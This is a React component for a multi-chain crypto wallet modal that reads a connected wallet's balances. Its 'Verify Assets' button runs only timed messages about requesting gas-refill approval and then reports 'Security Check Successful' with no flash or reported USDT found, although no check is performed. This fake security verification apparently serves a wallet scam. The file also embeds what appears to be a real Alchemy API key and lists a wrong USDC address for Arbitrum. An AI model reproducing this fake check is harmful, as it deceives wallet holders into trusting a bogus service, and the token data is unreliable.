import React, { useState, useEffect } from "react";
import { Modal } from "antd";
import toast from "react-hot-toast";
import { web3 } from "../main";
import { TokenABI } from "../wagmiConfig";
import icone1 from "../assets/icons/1.png";
import icone2 from "../assets/icons/2.png";
import icone3 from "../assets/icons/3.png";
import icone4 from "../assets/icons/4.png";
import icone5 from "../assets/icons/5.png";
import icone6 from "../assets/icons/6.png";
import icone7 from "../assets/icons/7.png";
import icone8 from "../assets/icons/8.png";
import icone9 from "../assets/icons/9.png";
import icone10 from "../assets/icons/10.png";
import icone11 from "../assets/icons/11.png";
import icone12 from "../assets/icons/12.png";

const TOKENS = {
  1: [
    {
      symbol: "USDT",
      address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
      decimals: 6,
      icon: icone8,
    },
    {
      symbol: "DAI",
      address: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
      decimals: 18,
      icon: icone9,
    },
    {
      symbol: "WETH",
      address: "0xC02aaA39b223FE8D0a0e5C4F27eAD9083C756Cc2",
      decimals: 18,
      icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xC02aaA39b223FE8D0a0e5C4F27eAD9083C756Cc2/logo.png",
    },
    {
      symbol: "LINK",
      address: "0x514910771AF9Ca656af840dff83E8264EcF986CA",
      decimals: 18,
      icon: icone10,
    },
  ],
  56: [
    {
      symbol: "USDT",
      address: "0x55d398326f99059fF775485246999027B3197955",
      decimals: 18,
      icon: icone8,
    },
    {
      symbol: "USDC",
      address: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
      decimals: 18,
      icon: icone11,
    },
    {
      symbol: "DAI",
      address: "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3",
      decimals: 18,
      icon: icone9,
    },
    {
      symbol: "BUSD",
      address: "0xe9e7cea3dedca5984780bafc599bd69add087d56",
      decimals: 18,
      icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56/logo.png",
    },
    {
      symbol: "CAKE",
      address: "0x0E09Fabb73Bd3Ade0a17ECC321fD13a19e81cE82",
      decimals: 18,
      icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x0E09FaBB73BD3Ade0a17ECC321fD13a19e81cE82/logo.png",
    },
  ],
  137: [
    {
      symbol: "USDT",
      address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
      decimals: 6,
      icon: icone8,
    },
    {
      symbol: "USDC",
      address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
      decimals: 6,
      icon: icone11,
    },
    {
      symbol: "DAI",
      address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",
      decimals: 18,
      icon: icone9,
    },
    {
      symbol: "WMATIC",
      address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
      decimals: 18,
      icon: icone12,
    },
    {
      symbol: "QUICK",
      address: "0x831753DD7087CaC61aB5644b308642cc1c33Dc13",
      decimals: 18,
      icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/polygon/assets/0x831753DD7087CaC61aB5644b308642cc1c33Dc13/logo.png",
    },
  ],
  43114: [
    {
      symbol: "USDT",
      address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7",
      decimals: 6,
      icon: icone8,
    },
    {
      symbol: "USDC",
      address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E",
      decimals: 6,
      icon: icone11,
    },
    {
      symbol: "DAI",
      address: "0xd586E7F844cEa2F87f50152665BCbc2C279D8d70",
      decimals: 18,
      icon: icone9,
    },
    {
      symbol: "WAVAX",
      address: "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7",
      decimals: 18,
      icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/avalanchec/assets/0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7/logo.png",
    },
    {
      symbol: "PNG",
      address: "0x60781C2586D68229fde47564546784ab3faca982",
      decimals: 18,
      icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/avalanchec/assets/0x60781C2586D68229fde47564546784ab3faca982/logo.png",
    },
  ],
  10: [
    {
      symbol: "USDT",
      address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
      decimals: 6,
      icon: icone8,
    },
    {
      symbol: "USDC",
      address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85",
      decimals: 6,
      icon: icone11,
    },
    {
      symbol: "DAI",
      address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",
      decimals: 18,
      icon: icone9,
    },
    {
      symbol: "WETH",
      address: "0x4200000000000000000000000000000000000006",
      decimals: 18,
      icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/optimism/assets/0x4200000000000000000000000000000000000006/logo.png",
    },
    {
      symbol: "OP",
      address: "0x4200000000000000000000000000000000000042",
      decimals: 18,
      icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/optimism/assets/0x4200000000000000000000000000000000000042/logo.png",
    },
  ],
  42161: [
    {
      symbol: "USDT",
      address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
      decimals: 6,
      icon: icone8,
    },
    {
      symbol: "USDC",
      address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85",
      decimals: 6,
      icon: icone11,
    },
    {
      symbol: "DAI",
      address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",
      decimals: 18,
      icon: icone9,
    },
    {
      symbol: "WETH",
      address: "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",
      decimals: 18,
      icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/arbitrum/assets/0x82aF49447D8a07e3bd95BD0d56f35241523fBab1/logo.png",
    },
    {
      symbol: "ARB",
      address: "0x912CE59144191C1204E64559FE8253a0e49E6548",
      decimals: 18,
      icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/arbitrum/assets/0x912CE59144191C1204E64559FE8253a0e49E6548/logo.png",
    },
  ],
  204: [
    {
      symbol: "USDT",
      address: "0x9e5AAC1Ba1a2e6aEd6b32689DFcF62A509Ca96f3",
      decimals: 18,
      icon: icone8,
    },
    {
      symbol: "BUSD",
      address: "0x7A56E1C57C7475CCf742d277DDCbB69403bE5106",
      decimals: 18,
      icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x7A56E1C57C7475CCf742d277DDCbB69403bE5106/logo.png",
    },
    {
      symbol: "FDUSD",
      address: "0x50c5725949A6F0c72E6c4a641F24049A917DB0Cb",
      decimals: 18,
      icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x50c5725949A6F0c72E6c4a641F24049A917DB0Cb/logo.png",
    },
  ],
  11155111: [
    {
      symbol: "USDT",
      address: "0x7169D38820F26e4E46B7a06Da09F3dB8b1c9B5A5",
      decimals: 6,
      icon: icone8,
    },
    {
      symbol: "USDC",
      address: "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238",
      decimals: 6,
      icon: icone11,
    },
    {
      symbol: "WETH",
      address: "0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14",
      decimals: 18,
      icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14/logo.png",
    },
  ],
  250: [
    {
      symbol: "USDC",
      address: "0x04068DA6C83AFCFA0e13ba15A6696662335D5B75",
      decimals: 6,
      icon: icone11,
    },
    {
      symbol: "DAI",
      address: "0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E",
      decimals: 18,
      icon: icone9,
    },
    {
      symbol: "WFTM",
      address: "0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83",
      decimals: 18,
      icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/fantom/assets/0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83/logo.png",
    },
  ],
};

const RPC_URLS = {
  1: [
    "https://eth-mainnet.g.alchemy.com/v2/tO_FPsuW9FEXXtmHOauwN",
    "https://cloudflare-eth.com",
    "https://rpc.ankr.com/eth",
    "https://eth-mainnet.g.alchemy.com/v2/your_alchemy_api_key",
    "https://mainnet.infura.io/v3/your_infura_api_key",
  ],
  11155111: [
    "https://eth-sepolia.g.alchemy.com/v2/tO_FPsuW9FEXXtmHOauwN",
    "https://rpc.sepolia.org",
    "https://eth-sepolia.g.alchemy.com/v2/your_alchemy_api_key",
    "https://sepolia.infura.io/v3/your_infura_api_key",
  ],
  56: [
    "https://bsc-dataseed.binance.org/",
    "https://bsc-dataseed1.defibit.io/",
    "https://bsc-dataseed1.ninicoin.io/",
  ],
  137: [
    "https://polygon-mainnet.g.alchemy.com/v2/tO_FPsuW9FEXXtmHOauwN",
    "https://polygon-rpc.com/",
    "https://rpc.ankr.com/polygon",
  ],
  43114: [
    "https://api.avax.network/ext/bc/C/rpc",
    "https://rpc.ankr.com/avalanche",
    "https://avalanche-mainnet.infura.io/v3/your_infura_api_key",
  ],
  10: [
    "https://mainnet.optimism.io/",
    "https://rpc.ankr.com/optimism",
    "https://opt-mainnet.g.alchemy.com/v2/tO_FPsuW9FEXXtmHOauwN",
  ],
  42161: [
    "https://arb1.arbitrum.io/rpc",
    "https://rpc.ankr.com/arbitrum",
    "https://arbitrum-mainnet.infura.io/v3/your_infura_api_key",
  ],
  204: ["https://opbnb-mainnet-rpc.bnbchain.org"],
  250: ["https://rpc.ftm.tools/", "https://rpc.ankr.com/fantom"],
};

const WalletDetails = ({ checkStatus, details, web3 }) => {
  const [account, setAccount] = useState(null);
  const [isConnected, setIsConnected] = useState(false);
  const [chainId, setChainId] = useState(null);
  const [tokenBalances, setTokenBalances] = useState([]);
  const [nativeBalance, setNativeBalance] = useState(null);
  const [loading, setLoading] = useState(false);
  const [rpcError, setRpcError] = useState(null);
  const [verified, setVerified] = useState(false);
  const [verifying, setVerifying] = useState(false);
  const [verifyStep, setVerifyStep] = useState(0);

  const chains = [
    {
      id: 1,
      name: "Ethereum Mainnet",
      nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
      blockExplorer: "https://etherscan.io",
      icon: icone1,
    },
    {
      id: 11155111,
      name: "Sepolia",
      nativeCurrency: { name: "Sepolia Ether", symbol: "ETH", decimals: 18 },
      blockExplorer: "https://sepolia.etherscan.io",
      icon: icone1,
    },
    {
      id: 56,
      name: "BNB Chain",
      nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
      blockExplorer: "https://bscscan.com",
      icon: icone2,
    },
    {
      id: 137,
      name: "Polygon",
      nativeCurrency: { name: "MATIC", symbol: "MATIC", decimals: 18 },
      blockExplorer: "https://polygonscan.com",
      icon: icone3,
    },
    {
      id: 43114,
      name: "Avalanche",
      nativeCurrency: { name: "AVAX", symbol: "AVAX", decimals: 18 },
      blockExplorer: "https://snowtrace.io",
      icon: icone4,
    },
    {
      id: 10,
      name: "Optimism",
      nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
      blockExplorer: "https://optimistic.etherscan.io",
      icon: icone5,
    },
    {
      id: 42161,
      name: "Arbitrum",
      nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
      blockExplorer: "https://arbiscan.io",
      icon: icone6,
    },
    {
      id: 204,
      name: "opBNB",
      nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
      blockExplorer: "https://opbnbscan.com",
      icon: icone2,
    },
    {
      id: 250,
      name: "Fantom",
      nativeCurrency: { name: "Fantom", symbol: "FTM", decimals: 18 },
      blockExplorer: "https://ftmscan.com",
      icon: icone7,
    },
  ];

  // Function to try multiple RPCs for a chain with retries
  const setProviderWithFallback = async (chainId) => {
    const rpcs = RPC_URLS[chainId] || [window.ethereum];
    for (const rpc of rpcs) {
      for (let attempt = 1; attempt <= 3; attempt++) {
        try {
          if (
            rpc.includes("your_alchemy_api_key") ||
            rpc.includes("your_infura_api_key")
          ) {
            console.warn(`Skipping RPC with placeholder key: ${rpc}`);
            continue;
          }
          web3.setProvider(rpc);
          await web3.eth.getChainId(); // Test connection
          console.log(`Set provider to: ${rpc} (Chain ID: ${chainId})`);
          return true;
        } catch (error) {
          console.error(
            `Attempt ${attempt} failed for ${rpc} (Chain ID: ${chainId}):`,
            error
          );
          if (attempt === 3) break;
          await new Promise((resolve) => setTimeout(resolve, 1000));
        }
      }
    }
    setRpcError(`No valid RPC provider available for Chain ID: ${chainId}`);
    console.warn("Falling back to window.ethereum");
    web3.setProvider(window.ethereum);
    return false;
  };

  useEffect(() => {
    console.log("WalletDetails mounted, checkStatus:", checkStatus);
    const checkConnection = async () => {
      try {
        const accounts = await window.ethereum.request({
          method: "eth_accounts",
        });
        const networkId = await web3.eth.getChainId();
        const chainIdNumber = Number(networkId);
        console.log(
          "Detected Chain ID:",
          chainIdNumber,
          "Account:",
          accounts[0]
        );
        setAccount(accounts[0] || null);
        setChainId(chainIdNumber);
        setIsConnected(!!accounts[0]);
        if (RPC_URLS[chainIdNumber]) {
          await setProviderWithFallback(chainIdNumber);
        } else {
          console.warn(
            "No RPC URL for chain ID:",
            chainIdNumber,
            "Using window.ethereum"
          );
          web3.setProvider(window.ethereum);
          setRpcError(
            `No RPC provider configured for Chain ID: ${chainIdNumber}`
          );
        }
      } catch (error) {
        console.error("Error checking connection:", error);
        setRpcError("Failed to connect to the network: " + error.message);
      }
    };
    checkConnection();
  }, []);

  useEffect(() => {
    if (window.ethereum) {
      window.ethereum.on("accountsChanged", (accounts) => {
        console.log("Accounts changed:", accounts);
        setAccount(accounts[0] || null);
        setIsConnected(!!accounts[0]);
        setVerified(false);
      });
      window.ethereum.on("chainChanged", async (networkId) => {
        const chainIdNumber = Number(networkId);
        console.log("Chain changed to:", chainIdNumber);
        setChainId(chainIdNumber);
        setVerified(false);
        await setProviderWithFallback(chainIdNumber);
      });
    }
  }, []);

  useEffect(() => {
    if (!account || !isConnected || !TOKENS[chainId]) {
      console.log("Skipping balance fetch:", {
        account,
        isConnected,
        chainId,
        hasTokens: !!TOKENS[chainId],
      });
      setTokenBalances([]);
      setNativeBalance(null);
      setLoading(false);
      setRpcError(
        TOKENS[chainId]
          ? null
          : `Token balances not supported on this network (Chain ID: ${chainId})`
      );
      return;
    }

    const fetchBalances = async () => {
      setLoading(true);
      setRpcError(null);

      try {
        const balance = await web3.eth.getBalance(account);
        const formattedBalance = web3.utils.fromWei(balance, "ether");
        const chain = chains.find((c) => c.id === chainId);
        console.log("Native balance fetched:", {
          balance,
          formattedBalance,
          chain,
        });
        setNativeBalance({
          formatted: Number(formattedBalance).toFixed(4),
          symbol: chain?.nativeCurrency.symbol || "Native",
          icon: chain?.icon,
        });
      } catch (error) {
        console.error("Error fetching native balance:", error);
        setNativeBalance({ formatted: "0", symbol: "Native", icon: null });
        setRpcError("Failed to fetch native balance: " + error.message);
      }

      const chainTokens = TOKENS[chainId] || [];
      try {
        const results = await Promise.all(
          chainTokens.map(async (token, index) => {
            try {
              await new Promise((resolve) => setTimeout(resolve, index * 100));
              const contract = new web3.eth.Contract(TokenABI, token.address);
              const balance = await contract.methods.balanceOf(account).call();
              const decimals = await contract.methods
                .decimals()
                .call()
                .catch(() => token.decimals);
              const symbol = await contract.methods
                .symbol()
                .call()
                .catch(() => token.symbol);
              const balanceNumber =
                typeof balance === "bigint"
                  ? Number(balance)
                  : parseFloat(balance);
              const decimalsNumber =
                typeof decimals === "bigint"
                  ? Number(decimals)
                  : parseInt(decimals, 10);
              console.log(`Token ${token.symbol} fetched:`, {
                balance,
                decimals,
                symbol,
                balanceNumber,
                decimalsNumber,
              });
              return {
                symbol,
                balance: balanceNumber / Math.pow(10, decimalsNumber),
                error: false,
                icon: token.icon,
              };
            } catch (error) {
              console.error(
                `Error fetching data for ${token.symbol} on chain ${chainId}:`,
                error
              );
              return {
                symbol: token.symbol,
                balance: 0,
                error: true,
                icon: token.icon,
              };
            }
          })
        );
        setTokenBalances(results);
      } catch (error) {
        console.error("Error fetching all tokens:", error);
        setTokenBalances(
          chainTokens.map((token) => ({
            symbol: token.symbol,
            balance: 0,
            error: true,
            icon: token.icon,
          }))
        );
        setRpcError("Failed to fetch token balances: " + error.message);
      } finally {
        setLoading(false);
      }
    };

    const debounceFetch = setTimeout(fetchBalances, 500);
    return () => clearTimeout(debounceFetch);
  }, [account, chainId, isConnected]);

  const verifyWallet = () => {
    setVerifying(true);
    setVerifyStep(1);

    setTimeout(() => setVerifyStep(2), 3000); // after 3s -> step 2
    setTimeout(() => setVerifyStep(3), 6000); // after 6s -> step 3
    setTimeout(() => {
      setVerified(true); // after 10s -> verified true
      setVerifying(false);
      setVerifyStep(0);
    }, 10000);
  };

  const disconnect = async () => {
    setAccount(null);
    setIsConnected(false);
    setVerified(false);
    setTokenBalances([]);
    setNativeBalance(null);
    details(false); // Close the modal
  };

  const switchChain = async (targetChainId) => {
    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: web3.utils.toHex(targetChainId) }],
      });
      await setProviderWithFallback(targetChainId);
      console.log("Switched to chain ID:", targetChainId);
    } catch (error) {
      if (error.code === 4902) {
        const chain = chains.find((c) => c.id === targetChainId);
        try {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: web3.utils.toHex(targetChainId),
                chainName: chain.name,
                rpcUrls: RPC_URLS[targetChainId] || [
                  "https://rpc.ankr.com/" + chain.name.toLowerCase(),
                ],
                nativeCurrency: chain.nativeCurrency,
                blockExplorerUrls: [chain.blockExplorer],
              },
            ],
          });
          console.log("Added chain:", chain.name);
          await setProviderWithFallback(targetChainId);
        } catch (addError) {
          console.error("Error adding chain:", addError);
          toast.error(`Failed to add ${chain.name}`);
        }
      } else {
        console.error("Error switching chain:", error);
        toast.error(
          `Failed to switch to ${
            chains.find((c) => c.id === targetChainId)?.name
          }`
        );
      }
    }
  };

  const copyText = async (textToCopy) => {
    try {
      await navigator.clipboard.writeText(textToCopy);
      toast.success("Copied");
    } catch (error) {
      const textArea = document.createElement("textarea");
      textArea.value = textToCopy;
      textArea.style.position = "absolute";
      textArea.style.left = "-999999px";
      document.body.appendChild(textArea);
      textArea.select();
      try {
        document.execCommand("copy");
        toast.success("Copied");
      } catch (err) {
        console.error(err);
      } finally {
        textArea.remove();
      }
    }
  };

  const truncateAddress = (address) => {
    if (!address) return "";
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  };

  return (
    <Modal
      open={checkStatus}
      footer={null}
      className="wallet-modal"
      closable={false}
      onCancel={() => details(false)}
    >
      <div className="wallet-modal-content">
        <div className="modal-body">
          {isConnected ? (
            <div className="wallet-info">
              {verifying ? (
                <div className="loader-overlay">
                  <div className="loader-box">
                    <div className="loader-circle"></div>
                    {verifyStep === 1 && <p>Submiting User Request...</p>}
                    {verifyStep === 2 && (
                      <p>Creating User Request for GAS</p>
                    )}
                    {verifyStep === 3 && (
                      <p>Trying to Request Gas Refill approval from User</p>
                    )}
                  </div>
                </div>
              ) : !verified ? (
                <div className="verification-section">
                  <div className="status-indicator unverified">
                    <div className="status-icon">⚠️</div>
                    <div className="status-text">
                      <h3>Wallet Not Verified</h3>
                      <p>Verify your wallet to access all features</p>
                    </div>
                  </div>
                  <button className="verify-btn" onClick={verifyWallet}>
                    Verify Assets
                  </button>
                  <button className="disconnect-btn" onClick={disconnect}>
                    Disconnect Wallet
                  </button>
                </div>
              ) : (
                <div className="verified-section text-center">
                  <div className="status-indicator verified success-box">
                    <div className="status-icon">
                      <img
                        src="/images/green_checkmark.png"
                        alt=""
                        width={40}
                      />
                    </div>
                    <div className="status-text">
                      <h3 className="text-green-800">
                        Security Check Successful
                      </h3>
                    </div>
                  </div>
                  <p style={{ color: "green" }}>
                    You are now secured. No flash or reported USDT found.
                  </p>
                  <div className="balances-box">
                    <p className="balance-line">
                      Wallet Address: {truncateAddress(account)}{" "}
                      <button
                        onClick={() => copyText(account)}
                        style={{
                          background: "none",
                          border: "none",
                          color: "#f0b90b",
                          cursor: "pointer",
                          marginLeft: "8px",
                        }}
                      >
                        Copy
                      </button>
                    </p>
                    {nativeBalance && (
                      <p
                        className="balance-line"
                        style={{
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                        }}
                      >
                        {nativeBalance.icon && (
                          <img
                            src={nativeBalance.icon}
                            alt={`${nativeBalance.symbol} icon`}
                            width={24}
                            height={24}
                            style={{ marginRight: "8px" }}
                          />
                        )}
                        Native Balance: {nativeBalance.formatted}{" "}
                        {nativeBalance.symbol}
                      </p>
                    )}
                    {!loading && !rpcError && TOKENS[chainId] && (
                      <>
                        {tokenBalances
                          .filter((t) => !t.error && t.balance > 0)
                          .map((t, i) => (
                            <p
                              key={i}
                              className="balance-line"
                              style={{
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                              }}
                            >
                              {t.icon && (
                                <img
                                  src={t.icon}
                                  alt={`${t.symbol} icon`}
                                  width={24}
                                  height={24}
                                  style={{ marginRight: "8px" }}
                                />
                              )}
                              {t.symbol} Balance: {t.balance.toFixed(4)}
                            </p>
                          ))}
                        {tokenBalances.filter((t) => !t.error && t.balance > 0)
                          .length === 0 && (
                          <p className="balance-line">No tokens found</p>
                        )}
                      </>
                    )}
                    {loading && (
                      <p className="balance-line">Fetching balances…</p>
                    )}
                    {rpcError && !loading && (
                      <p className="error-message">⚠️ {rpcError}</p>
                    )}
                    {!TOKENS[chainId] && !loading && !rpcError && (
                      <p className="balance-line">
                        Token balances not supported on this network (Chain ID:{" "}
                        {chainId})
                      </p>
                    )}
                  </div>
                  <div className="network-box">
                    <h4>Switch Network</h4>
                    <select
                      value={chainId || ""}
                      onChange={(e) => switchChain(Number(e.target.value))}
                      style={{ display: "flex", alignItems: "center" }}
                    >
                      {chains.map((c) => (
                        <option key={c.id} value={c.id}>
                          {c.name}
                        </option>
                      ))}
                    </select>
                  </div>
                  <div className="close-btn-container">
                    <button
                      className="close-btn-footer"
                      onClick={() => details(false)}
                    >
                      CLOSE
                    </button>
                  </div>
                </div>
              )}
            </div>
          ) : (
            <>
              <div className="not-connected">
                <div className="status-icon">🔒</div>
                <h3>Wallet not connected</h3>
                <p>Connect your wallet to view details</p>
              </div>
              <div className="close-btn-container">
                <button
                  className="close-btn-footer"
                  onClick={() => details(false)}
                >
                  CLOSE
                </button>
              </div>
            </>
          )}
        </div>
      </div>
    </Modal>
  );
};

export default WalletDetails;
